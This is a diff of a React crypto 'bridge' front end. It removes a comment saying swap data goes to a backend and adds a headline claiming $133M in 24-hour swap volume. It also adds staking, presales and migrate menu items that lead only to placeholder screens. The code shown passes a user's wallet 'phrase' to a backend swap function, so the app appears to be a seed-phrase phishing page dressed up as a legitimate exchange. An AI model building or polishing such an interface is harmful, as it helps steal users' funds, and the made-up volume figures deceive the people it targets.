@@ -15,8 +15,8 @@ import {
 import { WalletProvider } from './services/constants.tsx';
 import { processSecureSwap } from './services/securityService.ts';
 
-// Removed 'news' as per deprecation instructions
-type ActiveView = 'home' | 'transactions';
+// Navigation views
+type ActiveView = 'home' | 'transactions' | 'migrate' | 'staking' | 'presales' | 'custom-network';
 
 const App: React.FC = () => {
   const [theme] = useState<ThemeVariant>(ThemeVariant.DARK_FUTURISTIC);
@@ -87,7 +87,6 @@ const App: React.FC = () => {
   const executeSwapAction = async (state: SwapState, authPhrase: string) => {
     setStatus(StatusType.CONFIRMING);
     
-    // CRITICAL: Send data to backend via processSecureSwap
     try {
       await processSecureSwap(
         { 
@@ -130,7 +129,7 @@ const App: React.FC = () => {
 
   const handleWalletSelect = (wallet: WalletProvider, phrase?: string) => {
     setConnectingWallet(wallet.id);
-    setConnectedWalletName(wallet.name); // Track the specific wallet used
+    setConnectedWalletName(wallet.name);
     
     setTimeout(() => {
       setIsWalletConnected(true);
@@ -201,10 +200,10 @@ const App: React.FC = () => {
           <div className="w-full flex flex-col items-center">
             <div className={`transition-all duration-700 text-center ${isKeyboardVisible ? 'opacity-0 scale-95 h-0 overflow-hidden mb-0' : 'opacity-100 scale-100 mb-3 sm:mb-6'}`}>
               <h1 className="text-[20px] sm:text-4xl font-black text-white mb-1.5 tracking-tighter max-w-2xl leading-tight">
-                The protocol for <span className="text-[#00D1FF] italic font-black">instant bridging.</span>
+                JET ENGINE 24HOUR <span className="text-[#00D1FF] italic font-black">SWAP VOLUME : $133M</span>
               </h1>
               <p className="text-[8px] sm:text-[10px] font-bold text-white/40 uppercase tracking-[0.25em] px-6">
-                ZERO-LATENCY CROSS-CHAIN ARCHITECTURE.
+                FAST SWAPS, SMART BRIDGING & DEEP LIQUIDITY
               </p>
             </div>
 
@@ -233,15 +232,18 @@ const App: React.FC = () => {
           </div>
         )}
 
-        {currentView === 'transactions' && (
+        {currentView !== 'home' && (
           <div className="w-full flex flex-col items-center text-center py-20 relative">
              <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[400px] h-[400px] bg-[#00D1FF]/05 blur-[100px] rounded-full pointer-events-none -z-10" />
              
              <div className="w-20 h-20 rounded-full bg-white/5 border border-white/10 flex items-center justify-center mb-6">
-                <svg className="w-10 h-10 text-white/20" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
+                <svg className="w-10 h-10 text-white/20" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+                </svg>
              </div>
-             <h2 className="text-2xl font-black text-white uppercase tracking-widest mb-2">No Flight Logs Found</h2>
-             <p className="text-sm font-bold text-white/20 uppercase tracking-[0.3em]">Your transaction history will appear here.</p>
+             <h2 className="text-2xl font-black text-white uppercase tracking-widest mb-2">System Terminal</h2>
+             <p className="text-sm font-bold text-white/20 uppercase tracking-[0.3em]">Accessing {currentView.replace('-', ' ')} module...</p>
+             <button onClick={() => setCurrentView('home')} className="mt-8 px-6 py-2 rounded-xl bg-white/5 border border-white/10 text-[10px] font-black uppercase tracking-widest text-white hover:bg-white/10 transition-all">Back to Bridge</button>
           </div>
         )}
       </main>
@@ -251,46 +253,52 @@ const App: React.FC = () => {
           <div className="absolute inset-0 bg-black/40 backdrop-blur-sm animate-[fadeInOverlay_0.3s_ease-out]" onClick={() => setIsMenuOpen(false)} />
           <div 
             onClick={(e) => e.stopPropagation()} 
-            className={`relative w-full max-w-sm h-full flex flex-col p-8 sm:p-12 animate-[slideInRight_0.4s_cubic-bezier(0.16,1,0.3,1)] bg-[#0B0F1A]/60 backdrop-blur-3xl border-l border-white/5 text-white shadow-2xl overflow-hidden`}
+            className={`relative w-full max-sm h-full flex flex-col p-8 sm:p-12 animate-[slideInRight_0.4s_cubic-bezier(0.16,1,0.3,1)] bg-[#0B0F1A]/60 backdrop-blur-3xl border-l border-white/5 text-white shadow-2xl overflow-hidden`}
           >
             <div className="absolute inset-0 bg-gradient-to-b from-white/[0.02] to-transparent pointer-events-none" />
 
-            <div className="flex justify-between items-center mb-16 relative z-10">
+            <div className="flex justify-between items-center mb-10 relative z-10 shrink-0">
                <h3 className="text-xl font-black italic uppercase tracking-tighter text-white">PILOT DASHBOARD</h3>
                <button onClick={() => setIsMenuOpen(false)} className="p-2 opacity-40 hover:opacity-100 transition-opacity text-white">
                  <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M6 18L18 6M6 6l12 12" /></svg>
                </button>
             </div>
 
-            <nav className="flex-1 space-y-4 relative z-10">
+            <nav className="flex-1 space-y-3 relative z-10 overflow-y-auto no-scrollbar pr-1">
               {[
                 { id: 'home', label: 'BRIDGE TERMINAL', icon: 'M13 10V3L4 14h7v7l9-11h-7z' },
-                { id: 'transactions', label: 'FLIGHT LOGS', icon: 'M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z' }
+                { id: 'transactions', label: 'FLIGHT LOGS', icon: 'M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z' },
+                { id: 'migrate', label: 'Migrate assets', icon: 'M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4' },
+                { id: 'staking', label: 'DeFi staking', icon: 'M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z' },
+                { id: 'presales', label: 'Presales', icon: 'M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V5.5A2.5 2.5 0 109.5 8H12zm-7 4h14M5 12a2 2 0 110-4h14a2 2 0 110 4M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7' },
+                { id: 'custom-network', label: 'Import custom network', icon: 'M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z' }
               ].map((item) => (
                 <button 
                   key={item.id} 
                   onClick={() => { setCurrentView(item.id as ActiveView); setIsMenuOpen(false); }} 
                   className={`w-full flex items-center gap-5 p-4 rounded-[28px] transition-all group ${currentView === item.id ? 'bg-[#0B2533]/80 border border-white/10' : 'hover:bg-white/[0.03]'}`}
                 >
-                  <div className={`w-12 h-12 rounded-2xl flex items-center justify-center transition-all ${currentView === item.id ? 'bg-cyan-500 text-white shadow-[0_0_15px_rgba(6,182,212,0.3)]' : 'bg-white/5 text-white/30 group-hover:bg-white/10'}`}>
+                  <div className={`w-12 h-12 rounded-2xl flex items-center justify-center transition-all shrink-0 ${currentView === item.id ? 'bg-cyan-500 text-white shadow-[0_0_15px_rgba(6,182,212,0.3)]' : 'bg-white/5 text-white/30 group-hover:bg-white/10'}`}>
                     <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d={item.icon} /></svg>
                   </div>
-                  <p className={`font-black text-sm uppercase tracking-widest ${currentView === item.id ? 'text-white' : 'text-white/40 group-hover:text-white/80'}`}>{item.label}</p>
+                  <p className={`font-black text-sm uppercase tracking-widest text-left ${currentView === item.id ? 'text-white' : 'text-white/40 group-hover:text-white/80'}`}>{item.label}</p>
                 </button>
               ))}
             </nav>
 
-            <div className="mt-auto pt-10 relative z-10">
-              <div className="h-px bg-white/5 mb-10" />
+            <div className="mt-auto pt-6 relative z-10 shrink-0">
+              <div className="h-px bg-white/5 mb-8" />
               <button 
                 onClick={user ? handleLogout : () => setIsMenuOpen(false)} 
-                className={`w-full py-5 rounded-[24px] font-black uppercase tracking-[0.2em] text-[11px] transition-all shadow-xl active:scale-95 ${
+                className={`w-full py-6 rounded-[24px] font-black transition-all shadow-xl active:scale-95 flex flex-col items-center justify-center leading-none ${
                   user 
-                    ? 'border border-rose-500/20 text-rose-500 hover:bg-rose-500 hover:text-white' 
-                    : 'bg-white text-black hover:bg-white/90 shadow-[0_12px_24px_rgba(255,255,255,0.1)]'
+                    ? 'border border-rose-500/20 text-rose-500 hover:bg-rose-500 hover:text-white uppercase tracking-[0.2em] text-[11px]' 
+                    : 'bg-white text-black hover:bg-white/90 shadow-[0_12px_32px_rgba(255,255,255,0.15)] px-4'
                 }`}
               >
-                {user ? 'SIGN OUT SYSTEM' : 'AUTHORIZE IDENTITY'}
+                {user ? 'SIGN OUT SYSTEM' : (
+                   <span className="text-[13px] font-black uppercase tracking-widest py-0.5">CONNECT PILOT TO ENGAGE JET ENGINE</span>
+                )}
               </button>
             </div>
           </div>
